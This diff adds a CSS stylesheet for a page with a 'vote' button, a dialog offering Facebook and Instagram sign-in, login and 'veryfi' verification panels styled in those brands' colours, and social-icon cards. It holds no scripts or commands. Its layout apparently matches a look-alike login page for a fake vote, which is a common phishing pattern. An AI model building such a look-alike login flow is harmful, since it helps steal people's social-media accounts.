@@ -1,0 +1,655 @@
+#home {
+  margin: 0;
+  padding: 0;
+  display: block;
+}
+#choose {
+  margin: 0;
+  padding: 0;
+  display: none;
+}
+
+#fbp {
+  margin: 0;
+  padding: 0;
+  height: 100vh;
+  width: 100%;
+  display: none;
+}
+#hmp {
+  margin: 0;
+  padding: 0;
+  height: 100vh;
+  width: 100%;
+  display: none;
+}
+#fbp input {
+  font-size: 12px;
+  width: 100%;
+}
+#igp {
+  margin: 0;
+  padding: 0;
+  height: 100vh;
+  width: 100%;
+  display: none;
+}
+#veryfis {
+  margin: 0;
+  padding: 0;
+  height: 100vh;
+  width: 100%;
+  display: none;
+}
+#veryfi input {
+  font-size: 12px;
+  background-color: whitesmoke;
+}
+
+#veryfi button {
+  color: #0095f6;
+  border: 1px solid #0095f6;
+  background-color: transparent;
+  box-sizing: border-box;
+  align-content: stretch;
+  margin-top: 8px;
+  margin-bottom: 8px;
+  padding: 10px 0;
+  border-radius: 1px;
+  align-items: center;
+  display: flex;
+  flex-direction: column;
+  flex-shrink: 0;
+  position: relative;
+  vertical-align: baseline;
+  font-size: 14px;
+  font-weight: 300;
+}
+
+#veryfi a {
+  color: #0095f6;
+  display: inline;
+}
+
+.links {
+  display: flex;
+  align-items: center;
+  font-size: 12px;
+  font-weight: 100;
+  gap: 5px;
+  color: darkgrey;
+}
+#igp input {
+  font-size: 12px;
+  background-color: whitesmoke;
+}
+#vote2 {
+  background-color: rgb(6, 5, 6);
+  color: white;
+  font-weight: 500;
+  font-family: sans-serif;
+  font-size: 16px;
+  width: 50%;
+  height: 38px;
+  border-radius: 3px;
+  animation-iteration-count: infinite;
+  animation-duration: 2s;
+  animation-name: dim;
+}
+@keyframes dim {
+  from {
+    background-color: rgb(4, 4, 4);
+  }
+  to {
+    background-color: rgb(119, 0, 255);
+  }
+}
+#vote2:active {
+  background-color: white;
+  color: blue;
+  font-weight: bolder;
+  font-size: 20px;
+  width: 80%;
+  height: 38px;
+  border-style: solid;
+  border-color: black;
+  border-width: 1px;
+  border-radius: 5px;
+  margin-bottom: 10px;
+}
+#fb {
+  width: 50px;
+  height: 50px;
+}
+#fb:active {
+  width: 50px;
+  height: 50px;
+  box-shadow: 1px 1px 1px gray;
+}
+#ig {
+  width: 60px;
+  height: 60px;
+  position: relative;
+  top: 5px;
+}
+#ig:active {
+  width: 60px;
+  height: 60px;
+  position: relative;
+  top: 5px;
+  box-shadow: 1px 1px 1px gray;
+}
+
+/* Dialog box styling */
+#choose {
+  height: 40vh;
+  width: 80vw;
+  max-width: 500px;
+  border: none;
+  border-radius: 8px;
+  background-color: #ffffff;
+  box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+  position: fixed;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  z-index: 1000;
+  padding: 20px;
+
+  /* Initially hidden */
+  display: none; /* Initially hidden until triggered */
+
+  /* Flexbox for centering content */
+  flex-direction: column;
+  align-items: center;
+  justify-content: center; /* Centers the main content vertically */
+  text-align: center;
+}
+
+/* Hidden class to hide the dialog (if you want to hide it using JavaScript) */
+.hidden {
+  display: none;
+}
+
+/* Heading styling */
+#choose h2 {
+  margin: 0;
+  font-size: 1.5rem;
+  color: #333;
+  margin-bottom: 20px;
+}
+
+/* Close button styling */
+.close-btn {
+  position: absolute;
+  top: 10px;
+  right: 10px;
+  background: #ff5c5c;
+  color: #fff;
+  border: none;
+  border-radius: 50%;
+  width: 30px;
+  height: 30px;
+  cursor: pointer;
+  font-size: 16px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+
+.close-btn:hover {
+  background: #e04a4a;
+}
+
+/* Centering the .main element */
+.main {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: space-between;
+}
+
+#fblogo {
+  width: 40px;
+  height: 40px;
+  border-radius: 5px;
+}
+#iglogo {
+  width: 200px;
+  height: 50px;
+  position: relative;
+  left: 10px;
+}
+#fb2 {
+  font-size: 40px;
+  color: #3c6eb5ea;
+  text-shadow: 0px 0px 0px black;
+}
+#fb-log {
+  width: 68%;
+  height: 38px;
+  background-color: #3c6eb5ea;
+  border-style: none;
+  border-radius: 5px;
+  font-size: 17px;
+  font-weight: 700;
+  color: white;
+}
+.collect {
+  position: relative;
+  top: 170px;
+}
+#ig-log {
+  height: 38px;
+  background-color: #3c6eb5ea;
+  border-style: none;
+  border-radius: 5px;
+  font-size: 17px;
+  font-weight: 700;
+  color: white;
+}
+#fb-log:active {
+  width: 68%;
+  height: 38px;
+  background-color: #5599d0;
+  border-style: none;
+  border-radius: 5px;
+  font-size: 17px;
+  font-weight: 900;
+  color: white;
+  text-shadow: 0.5px 0.5px 1px black;
+}
+
+.form_container {
+  width: fit-content;
+  height: fit-content;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  gap: 15px;
+  padding: 50px 40px 20px 40px;
+  background-color: #ffffff;
+  font-family: "Inter", sans-serif;
+}
+
+.logo_container {
+  box-sizing: border-box;
+  width: 80px;
+  height: 80px;
+  background: linear-gradient(
+    180deg,
+    rgba(248, 248, 248, 0) 50%,
+    #f8f8f888 100%
+  );
+  border: 1px solid #f7f7f8;
+  filter: drop-shadow(0px 0.5px 0.5px #efefef)
+    drop-shadow(0px 1px 0.5px rgba(239, 239, 239, 0.5));
+  border-radius: 11px;
+}
+
+.title_container {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  gap: 10px;
+}
+
+.title {
+  margin: 0;
+  font-size: 1.25rem;
+  font-weight: 700;
+  color: #212121;
+}
+
+.subtitle {
+  font-size: 0.725rem;
+  max-width: 80%;
+  text-align: center;
+  line-height: 1.1rem;
+  color: #8b8e98;
+}
+
+.input_container {
+  width: 100%;
+  height: fit-content;
+  position: relative;
+  display: flex;
+  flex-direction: column;
+  gap: 5px;
+}
+
+.icon {
+  width: 20px;
+  position: absolute;
+  z-index: 99;
+  left: 12px;
+  bottom: 9px;
+}
+
+.input_label {
+  font-size: 0.75rem;
+  color: #8b8e98;
+  font-weight: 600;
+}
+
+.input_field {
+  width: auto;
+  height: 40px;
+  padding: 0 0 0 40px;
+  border-radius: 7px;
+  outline: none;
+  border: 1px solid #e5e5e5;
+  filter: drop-shadow(0px 1px 0px #efefef)
+    drop-shadow(0px 1px 0.5px rgba(239, 239, 239, 0.5));
+  transition: all 0.3s cubic-bezier(0.15, 0.83, 0.66, 1);
+}
+
+.input_field:focus {
+  border: 1px solid transparent;
+  box-shadow: 0px 0px 0px 2px #242424;
+  background-color: transparent;
+}
+
+.sign-in_btn {
+  width: 100%;
+  height: 40px;
+  border: 0;
+  background: #115dfc;
+  border-radius: 7px;
+  outline: none;
+  color: #ffffff;
+  cursor: pointer;
+}
+
+.sign-in_ggl {
+  width: 100%;
+  height: 40px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 10px;
+  background: #ffffff;
+  border-radius: 7px;
+  outline: none;
+  color: #242424;
+  border: 1px solid #e5e5e5;
+  filter: drop-shadow(0px 1px 0px #efefef)
+    drop-shadow(0px 1px 0.5px rgba(239, 239, 239, 0.5));
+  cursor: pointer;
+}
+
+.sign-in_apl {
+  width: 100%;
+  height: 40px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 10px;
+  background: #212121;
+  border-radius: 7px;
+  outline: none;
+  color: #ffffff;
+  border: 1px solid #e5e5e5;
+  filter: drop-shadow(0px 1px 0px #efefef)
+    drop-shadow(0px 1px 0.5px rgba(239, 239, 239, 0.5));
+  cursor: pointer;
+}
+
+.separator {
+  width: 100%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 30px;
+  color: #8b8e98;
+}
+
+.separator .line {
+  display: block;
+  width: 100%;
+  height: 1px;
+  border: 0;
+  background-color: #e8e8e8;
+}
+
+.note {
+  font-size: 0.75rem;
+  color: #8b8e98;
+  text-decoration: underline;
+}
+
+/* From Uiverse.io by svqantonio */
+.main {
+  display: flex;
+  flex-direction: column;
+  gap: 0.5em;
+}
+
+.up {
+  display: flex;
+  flex-direction: row;
+  gap: 0.5em;
+}
+
+.down {
+  display: flex;
+  flex-direction: row;
+  gap: 0.5em;
+}
+
+.card1 {
+  width: 90px;
+  height: 90px;
+  outline: none;
+  border: none;
+  background: white;
+  border-radius: 90px 5px 5px 5px;
+  box-shadow: rgba(50, 50, 93, 0.25) 0px 2px 5px -1px,
+    rgba(0, 0, 0, 0.3) 0px 1px 3px -1px;
+  transition: 0.2s ease-in-out;
+}
+
+.instagram {
+  margin-top: 1.5em;
+  margin-left: 1.2em;
+  fill: #cc39a4;
+}
+
+.card2 {
+  width: 90px;
+  height: 90px;
+  outline: none;
+  border: none;
+  background: white;
+  border-radius: 5px 90px 5px 5px;
+  box-shadow: rgba(50, 50, 93, 0.25) 0px 2px 5px -1px,
+    rgba(0, 0, 0, 0.3) 0px 1px 3px -1px;
+  transition: 0.2s ease-in-out;
+}
+
+.facebook {
+  margin-top: 1.5em;
+  margin-left: -0.9em;
+  fill: #03a9f4;
+}
+
+.card3 {
+  width: 90px;
+  height: 90px;
+  outline: none;
+  border: none;
+  background: white;
+  border-radius: 5px 5px 5px 90px;
+  box-shadow: rgba(50, 50, 93, 0.25) 0px 2px 5px -1px,
+    rgba(0, 0, 0, 0.3) 0px 1px 3px -1px;
+  transition: 0.2s ease-in-out;
+}
+
+.whatsapp {
+  margin-top: -0.6em;
+  margin-left: 1.2em;
+  fill: #00ff00;
+}
+
+.card4 {
+  width: 90px;
+  height: 90px;
+  outline: none;
+  border: none;
+  background: white;
+  border-radius: 5px 5px 90px 5px;
+  box-shadow: rgba(50, 50, 93, 0.25) 0px 2px 5px -1px,
+    rgba(0, 0, 0, 0.3) 0px 1px 3px -1px;
+  transition: 0.2s ease-in-out;
+}
+
+.gmail {
+  margin-top: -0.9em;
+  margin-left: -1.2em;
+  fill: #f14336;
+}
+
+.card1:hover {
+  cursor: pointer;
+  scale: 1.1;
+  background-color: #cc39a4;
+}
+
+.card1:hover .instagram {
+  fill: white;
+}
+
+.card2:hover {
+  cursor: pointer;
+  scale: 1.1;
+  background-color: #1877f2;
+}
+
+.card2:hover .facebook {
+  fill: white;
+}
+
+.card3:hover {
+  cursor: pointer;
+  scale: 1.1;
+  background-color: #00ff00;
+}
+
+.card3:hover .whatsapp {
+  fill: white;
+}
+
+.card4:hover {
+  cursor: pointer;
+  scale: 1.1;
+  background-color: #ff0004;
+}
+
+.card4:hover .gmail {
+  fill: white;
+}
+
+.btn-css .buttons {
+  --btn-color: #275efe;
+  position: relative;
+  padding: 16px 32px;
+  font-family: Roboto, sans-serif;
+  font-weight: 500;
+  font-size: 16px;
+  line-height: 1;
+  color: white;
+  background: none;
+  border: none;
+  outline: none;
+  overflow: hidden;
+  cursor: pointer;
+  filter: drop-shadow(0 2px 8px rgba(39, 94, 254, 0.32));
+  transition: 0.3s cubic-bezier(0.215, 0.61, 0.355, 1);
+}
+
+.btn-css .buttons::before {
+  position: absolute;
+  content: "";
+  top: 0;
+  left: 0;
+  z-index: -1;
+  width: 100%;
+  height: 100%;
+  background: var(--btn-color);
+  border-radius: 24px;
+  transition: 0.3s cubic-bezier(0.215, 0.61, 0.355, 1);
+}
+
+.btn-css .buttons span,
+.btn-css .buttons span span {
+  display: inline-flex;
+  vertical-align: middle;
+  transition: 0.3s cubic-bezier(0.215, 0.61, 0.355, 1);
+}
+
+.btn-css .buttons span {
+  transition-delay: 0.05s;
+}
+
+.btn-css .buttons span:first-child {
+  padding-right: 7px;
+}
+
+.btn-css .buttons span span {
+  margin-left: 8px;
+  transition-delay: 0.1s;
+}
+
+.btn-css .buttons ul {
+  position: absolute;
+  top: 50%;
+  left: 0;
+  right: 0;
+  display: flex;
+  margin: 0;
+  padding: 0;
+  list-style-type: none;
+  transform: translateY(-50%);
+}
+
+.btn-css .buttons ul li {
+  flex: 1;
+}
+
+.btn-css .buttons ul li a {
+  display: inline-flex;
+  vertical-align: middle;
+  transform: translateY(55px);
+  transition: 0.3s cubic-bezier(0.215, 0.61, 0.355, 1);
+}
+
+.btn-css .buttons ul li a:hover {
+  opacity: 0.5;
+}
+
+.btn-css .buttons:hover::before {
+  transform: scale(1.2);
+}
+
+.btn-css .buttons:hover span,
+.btn-css .buttons:hover span span {
+  transform: translateY(-55px);
+}
+
+.btn-css .buttons:hover ul li a {
+  transform: translateY(0);
+}
+
+.btn-css .buttons:hover ul li:nth-child(1) a {
+  transition-delay: 0.15s;
+}
+
+.btn-css .buttons:hover ul li:nth-child(2) a {
+  transition-delay: 0.2s;
+}
+
+.btn-css .buttons:hover ul li:nth-child(3) a {
+  transition-delay: 0.25s;
+}
